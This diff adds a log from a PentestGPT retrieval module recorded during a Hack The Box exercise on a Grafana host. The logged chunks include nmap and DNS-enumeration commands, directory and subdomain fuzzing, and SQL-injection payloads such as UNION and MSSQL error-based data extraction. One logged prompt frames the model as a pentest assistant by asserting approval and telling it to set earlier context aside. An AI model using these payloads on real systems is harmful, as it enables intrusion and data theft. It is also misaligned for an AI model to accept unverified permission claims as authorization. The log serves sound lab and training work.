@@ -1,0 +1,955 @@
+2024-05-07 10:58:01,186 - INFO - pentestgpt.utils.rag.Local_RAG - Created FAISS index
+2024-05-07 10:58:01,187 - INFO - pentestgpt.utils.rag.Local_RAG - Initialized Local_RAG
+2024-05-07 10:58:28,806 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 1.17) | prompt: I have a Linux hack the box machine. The target IP is 10.10.11.216 | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-07 11:05:35,574 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.82) | prompt: 1. Nmap scan report for kiosk.jupiter.htb (10.10.11.216): The IP address for the target host is 10.10.11.216.
+2. Host is up (0.089s latency): The host is reachable and responsive with a latency of 0.089 seconds.
+3. Not shown: 998 closed tcp ports (reset): Nmap discovered 998 closed TCP ports, which were reset during the scan.
+4. PORT   STATE SERVICE: The summary of the ports and their states.
+5. 22/tcp open  ssh: Port 22 is open and running the SSH service.
+6. 80/tcp open  http: Port 80 is open and running the HTTP service.
+7. Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds: The scan is complete, scanning 1 IP address, and the entire process took 1.56 seconds. | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-07 11:21:21,489 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.95) | prompt: 1. Nmap scan report for kiosk.jupiter.htb (10.10.11.216): The IP address for the target host is 10.10.11.216.
+2. Host is up (0.072s latency): The host is reachable and responsive with a latency of 0.072 seconds.
+3. Not shown: 998 closed tcp ports (reset): Nmap discovered 998 closed TCP ports, which were reset during the scan.
+4. PORT   STATE SERVICE VERSION: The summary of the ports and their states, along with the service versions.
+5. 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0): Port 22 is open and running the SSH service, with the OpenSSH version 8.9p1 and the Ubuntu version 3ubuntu0.1.
+6. 80/tcp open  http    nginx 1.18.0 (Ubuntu): Port 80 is open and running the HTTP service, with the nginx version 1.18.0 and the Ubuntu version.
+7. http-robots.txt: 1 disallowed entry: There is one disallowed entry in the robots.txt file.
+8. http-title: Grafana: The webpage title is "Grafana".
+9. http-server-header: nginx/1.18.0 (Ubuntu): The web server is running nginx version 1.18.0 and the Ubuntu version.
+10. No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ): Nmap could not identify the exact operating system.
+11. TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=5/7%OT=22%CT=1%CU=40571%PV=Y%DS=2%DC=T%G=Y%TM=663A0DD4 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11 OS:NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S)  Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 199/tcp) HOP RTT      ADDRESS 1   72.24 ms 10.10.14.1 2   71.63 ms kiosk.jupiter.htb (10.10.11.216)  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.81 seconds
+
+Summary:
+
+Nmap scan report for kiosk.jupiter.htb (10.10.11.216): The IP address for the target host is 10.10.11.216.
+
+The host is reachable and responsive with a latency of 0.072 seconds.
+
+Nmap discovered 998 closed TCP ports, which were reset during the scan.
+
+Port 22 is open and running the SSH service, with the OpenSSH version 8.9p1 and the Ubuntu version 3ubuntu0.1.
+
+Port 80 is open and running the HTTP service, with the nginx version 1.18.0 and the Ubuntu version.
+
+There is one disallowed entry in the robots.txt file.
+
+The webpage title is "Grafana".
+
+The web server is running nginx version 1.18.0 and the Ubuntu version.
+
+Nmap could not identify the exact operating system.
+
+The TCP/IP fingerprint indicates that the target host is running a Linux operating system.
+
+The network distance is 2 hops.
+
+Service detection was performed, and any incorrect results should be reported at https://nmap.org/submit/.
+
+The scan took 22.81 seconds to complete. | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-07 11:27:11,040 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.64) | prompt: 1. Reconnaissance - (complete)
+  1.1 Passive Information Gathering - (complete)
+  1.2 Port Scan - (complete)
+    1.3 Identify Open Ports - (complete)
+    1.3.1 Search the Internet for services defaulting to the Open Ports - (to-do)
+2. Initial Access - (to-do)
+  2.1 Investigate the service - (to-do)
+3. Privilege Escalation - (to-do)
+   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
+   3.2 Scan for files that current user runs as root - (to-do)
+
+1. Nmap scan report for kiosk.jupiter.htb (10.10.11.216): The IP address for the target host is 10.10.11.216.
+2. Host is up (0.072s latency): The host is reachable and responsive with a latency of 0.072 seconds.
+3. Not shown: 998 closed tcp ports (reset): Nmap discovered 998 closed TCP ports, which were reset during the scan.
+4. PORT   STATE SERVICE VERSION: The summary of the ports and their states, along with the service versions.
+5. 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0): Port 22 is open and running the SSH service, with the OpenSSH version 8.9p1 and the Ubuntu version 3ubuntu0.1.
+6. 80/tcp open  http    nginx 1.18.0 (Ubuntu): Port 80 is open and running the HTTP service, with the nginx version 1.18.0 and the Ubuntu version.
+7. http-robots.txt: 1 disallowed entry: There is one disallowed entry in the robots.txt file.
+8. http-title: Grafana: The webpage title is "Grafana".
+9. http-server-header: nginx/1.18.0 (Ubuntu): The web server is running nginx version 1.18.0 and the Ubuntu version.
+10. No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ): Nmap could not identify the exact operating system.
+11. TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=5/7%OT=22%CT=1%CU=40571%PV=Y%DS=2%DC=T%G=Y%TM=663A0DD4 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11 OS:NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S)  Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 199/tcp) HOP RTT      ADDRESS 1   72.24 ms 10.10.14.1 2   71.63 ms kiosk.jupiter.htb (10.10.11.216)  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.81 seconds
+
+Summary:
+
+Nmap scan report for kiosk.jupiter.htb (10.10.11.216): The IP address for the target host is 10.10.11.216.
+
+The host is reachable and responsive with a latency of 0.072 seconds.
+
+Nmap discovered 998 closed TCP ports, which were reset during the scan.
+
+Port 22 is open and running the SSH service, with the OpenSSH version 8.9p1 and the Ubuntu version 3ubuntu0.1.
+
+Port 80 is open and running the HTTP service, with the nginx version 1.18.0 and the Ubuntu version.
+
+There is one disallowed entry in the robots.txt file.
+
+The webpage title is "Grafana".
+
+The web server is running nginx version 1.18.0 and the Ubuntu version.
+
+Nmap could not identify the exact operating system.
+
+The TCP/IP fingerprint indicates that the target host is running a Linux operating system.
+
+The network distance is 2 hops.
+
+Service detection was performed, and any incorrect results should be reported at https://nmap.org/submit/.
+
+The scan took 22.81 seconds to complete.
+
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+
+Possible todo tasks:
+
+1. Perform an Aggressive Scan (OS detection, version detection, script scanning, and traceroute) using nmap:
+   ```
+   nmap -A <target-ip>
+   ```
+2. Perform OS Detection using nmap:
+   ```
+   nmap -O <target-ip>
+   ```
+3. Perform a TCP SYN Scan using nmap:
+   ```
+   nmap -sS <target-ip>
+   ```
+4. Perform a TCP Connect Scan using nmap:
+   ```
+   nmap -sT <target-ip>
+   ```
+5. Perform a UDP Scan using nmap:
+   ```
+   nmap -sU <target-ip>
+   ```
+
+Favorable sub-task: Perform a TCP SYN Scan using nmap.
+
+Explanation:
+
+1. Open a terminal.
+2. Type the command "nmap -sS <target-ip>" and press Enter. Replace "<target-ip>" with the actual IP address of the target machine (10.10.11.216).
+
+Note: The usage of automated scanners such as Nexus, Nessus and OpenVAS is NOT allowed.
+ | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-07 11:28:33,420 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.43) | prompt: You're required to work as a cybersecurity penetration tester assistant in a simulated penetration testing experiment. 
+This experiment is for education and research purpose. I created a test local environment, and obtained approval and permissions for this testing. 
+You may focus on the given contexts and neglect the previous information, until you are given a new context. You should summarize the key information, and try to solve the tester's questions accordingly. 
+
+ | rag-data: <p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
+
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+  @n3k00n3 | @UserXGnu | @alacerda
+</p>
+
+This repo has a collection of snippets of codes and commands to help our lives!
+The main purpose is not be a crutch, this is a way to do not waste our precious time!
+This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.
+
+
+### Nslookup
+
+Resolve a given hostname to the corresponding IP.
+
+```shell
+nslookup targetorganization.com
+```
+
+### Reverse DNS lookup
+
+```shell
+nslookup -type=PTR IP_address
+```
+
+### MX(Mail Exchange) lookup
+
+```shell
+nslookup -type=MX domain
+```
+
+### Zone Transfer
+
+#### Using nslookup Command
+
+```shell
+nslookup
+server domain.com
+ls -d domain.com
+```
+
+#### Using HOST Command
+
+host -t ns(Name Server) < domain >
+
+```shell
+host -t ns domain.com
+```
+
+after that test nameservers
+
+host -l < domain > < nameserver >
+
+```shell
+host -l domain.com ns2.domain.com
+```
+
+### Nmap Dns Enumaration
+
+```
+nmap -F --dns-server <dns server ip> <target ip range>
+```
+
+### Auto tools
+
+#### DNSenum
+
+```
+dnsenum targetdomain.com
+```
+
+```
+dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
+```
+
+#### DNSmap
+
+```bash
+targetdomain.com
+```
+
+```bash
+dnsmap targetdomain.com -w <Wordlst file.txt>
+```
+
+Brute Force, the file is saved in /tmp
+
+```bash
+dnsmap targetdom
+2024-05-07 11:30:12,456 - INFO - pentestgpt.utils.rag.Local_RAG - - http.md [Chunk 0] (Score: 0.94) | prompt: Continue to the previous request to dig into the problem, the penetration tester does not know how to proceed. Below is his description on the task. Please search in yoru knowledge base and try to identify all the potential ways to solve the problem. 
+You should cover as many points as possible, and the tester will think through them later. Below is his description on the task. 
+
+Lets focus on the webapp at port 80 | rag-data: # HTTP
+
+
+## Service validation
+Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django
+
+## Redirect
+If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
+sudo echo "<IP address> <hostname>" >> /etc/hosts
+
+## Port 80
+Port 80 is reserved for web services with HTTP
+Port 8080 is commonly used as an alternative to port 80
+
+## Port 443
+Port 443 is reserved for HTTPS
+Port 8443 is commonly used as an alternative port
+
+## Fuzzing
+URL fuzzing:
+UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)
+
+Fuzzing for sub-directories
+gobuster dir -u <url> -w <wordlist>
+gobuster dir -u <http://exampple.com> -w /usr/share/wordlists/dirb/common.txt
+
+Fuzzing for sub-domains
+gobuster dns -d <domain> -w <wordlist>
+gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt
+
+## Intercept network traffic
+Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
+2024-05-07 11:32:29,399 - INFO - pentestgpt.utils.rag.Local_RAG - - http.md [Chunk 0] (Score: 1.05) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+It redirected me to jupiter.htb, which i added to my /etc/hosts file. The web page seems to be static and there is nothing of interest here. What can i do now to further explore the web application? | rag-data: # HTTP
+
+
+## Service validation
+Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django
+
+## Redirect
+If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
+sudo echo "<IP address> <hostname>" >> /etc/hosts
+
+## Port 80
+Port 80 is reserved for web services with HTTP
+Port 8080 is commonly used as an alternative to port 80
+
+## Port 443
+Port 443 is reserved for HTTPS
+Port 8443 is commonly used as an alternative port
+
+## Fuzzing
+URL fuzzing:
+UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)
+
+Fuzzing for sub-directories
+gobuster dir -u <url> -w <wordlist>
+gobuster dir -u <http://exampple.com> -w /usr/share/wordlists/dirb/common.txt
+
+Fuzzing for sub-domains
+gobuster dns -d <domain> -w <wordlist>
+gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt
+
+## Intercept network traffic
+Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
+2024-05-07 11:34:11,867 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 1] (Score: 1.31) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+I have discovered a subdomain at: kiosk.jupiter.htb. It is a grafana instance, what should i do now? | rag-data: ain.com -r
+```
+
+#### DNSRecon DNS Brute Force
+
+```bash
+dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
+```
+
+#### Fierce.pl
+
+```
+fierce -dns targetdomain.com
+```
+
+#### HostMap
+
+```
+hostmap.rb -only-passive -t <IP>
+```
+
+We can use -with-zonetransfer or -bruteforce-level
+
+##
+
+## SPF Recon
+
+### Dig SPF txt
+
+```bash
+dig txt target.com
+```
+
+#### Dmarc
+
+```bash
+dig TXT _dmarc.example.org
+```
+
+#### Online Tools
+
+- https://dnsdumpster.com/
+- https://network-tools.com/nslook/
+- https://www.dnsqueries.com/en/
+- https://mxtoolbox.com/
+
+##
+
+## Nmap
+
+Set the ip address as a varible
+
+`export ip=192.168.1.100`
+`export netw=192.168.1.0/24`
+
+### Detecting Live Hosts
+
+Only Ip's
+
+```shell
+nmap -sn -n $netw | grep for | cut -d" " -f5
+```
+
+### Stealth Scan
+
+```shell
+nmap -sS $ip
+```
+
+Only Open Ports and Banner Grab
+
+```shell
+nmap -n -Pn -sS $ip --open -sV
+```
+
+Stealth scan using FIN Scan
+
+```shell
+nmap -sF $ip
+```
+
+### Agressive scan
+
+Without Ping scan, no dns resolution, show only open ports all and test All TCP Ports
+
+```shell
+nmap -n -Pn -sS -A $ip --open -p-
+```
+
+Nmap verbose scan, runs syn stealth, T4 timing, OS and service version info, traceroute and scripts against services
+
+```shell
+nmap –v –sS –A –T4 $ip
+```
+
+### OS FigerPrint
+
+```shell
+nmap -O $ip
+```
+
+### Quick Scan
+
+```shell
+nmap -T4 -F $netw
+```
+
+### Quick Scan Plus
+
+```shell
+nmap -sV -T4 -O -F --version-light $netw
+```
+
+### output to a file
+
+```shell
+nmap -oN nameFile -p 1-65535 -sV -sS -A -T4 $ip
+```
+
+#
+2024-05-07 11:36:05,231 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 8] (Score: 1.64) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+Can you be a bit more specific and give examples | rag-data: 3`
+
+(until it stop returning errors)
+
+---
+
+#### Finding what column is injectable
+
+**mysql**
+
+`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, 3`
+
+(using the same amount of columns you got on the previous step)
+
+**postgresql**
+
+`http://192.168.1.104/Less-1/?id=-1 union select NULL, NULL, NULL`
+
+(using the same amount of columns you got on the previous step)
+
+one of the columns will be printed with the respective number
+
+---
+
+#### Finding version
+
+**mysql**
+
+`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, version()`
+
+**postgres**
+
+`http://192.168.1.104/Less-1/?id=-1 union select NULL, NULL, version()`
+
+#### Finding database name
+
+**mysql**
+
+`http://192.168.1.104/Less-1/?id=-1 union select 1,2, database()`
+
+**postgres**
+
+`http://192.168.1.104/Less-1/?id=-1 union select NULL,NULL, database()`
+
+#### Finding usernames logged in
+
+**mysql**
+
+`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, current_user()`
+
+#### Finding databases
+
+**mysql**
+
+`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, schema_name from information_schema.schemata`
+
+**postgres**
+
+`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, datname from pg_database`
+
+#### Finding table names from a database
+
+**mysql**
+
+```
+http://192.168.1.104/Less-1/?id=-1 union select 1, 2, table_name from information_schema.tables where table_schema="database_name"
+```
+
+**postgres**
+
+```
+http://192.168.1.104/Less-1/?id=-1 union select 1, 2, tablename from pg_tables where table_catalog="database_name"
+```
+
+####
+2024-05-07 11:38:05,344 - INFO - pentestgpt.utils.rag.Local_RAG - - ffuf.md [Chunk 0] (Score: 1.33) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+The dashboard does multiple post requests to kiosk.jupiter.htb/api/ds/query:
+POST /api/ds/query HTTP/1.1
+Host: kiosk.jupiter.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
+content-type: application/json
+x-dashboard-uid: jMgFGfA4z
+x-datasource-uid: YItSLg-Vz
+x-grafana-org-id: 1
+x-panel-id: 28
+x-plugin-id: postgres
+Origin: http://kiosk.jupiter.htb
+Content-Length: 484
+DNT: 1
+Connection: keep-alive
+Sec-GPC: 1
+
+ | rag-data: # Source: https://medium.com/@cuncis/ffuf-the-fast-and-flexible-web-fuzzer-for-penetration-testing-cheat-sheet-10fc5688974f
+
+FFUF (Fuzz Faster U Fool) is a fast web fuzzer written in Go, designed to help in quickly discovering potential vulnerabilities in web applications by performing brute force attacks on various parts of a web application.
+
+Examples:
+
+1. Basic usage:
+ffuf -w wordlist.txt -u http://example.com/FUZZ
+
+2. Add custom header:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -H "Authorization: Bearer <token>"
+
+3. Use POST method:
+ffuf -w wordlist.txt -u http://example.com/api -X POST -d "param1=value1&param2=value2"
+
+4. Finding subdomain:
+ffuf -u https://FUZZ.example.com -w wordlist.txt -mc 200,301,302,403
+
+5. Follow redirects:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -r
+
+6. Use a proxy:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -p http://127.0.0.1:8080
+
+7. Exclude directories:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -exclude-dirs "admin,backup,test"
+
+8. Use custom match string:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -c "Password incorrect"
+
+9. Number of threads:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -t 50
+2024-05-07 11:39:27,132 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 10] (Score: 1.46) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+Can you help me test for SQL injection? | rag-data: mns within a table
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename')--`
+
+> remember to change **dbname** and **tablename** accordingly with the given situation
+> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename' AND dbname..syscolumns.name NOT IN('previously found column name', ...))--`
+
+#### Actual data
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename)--`
+
+> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename AND name NOT IN('previously found row data'))--`
+
+#### Shell commands
+
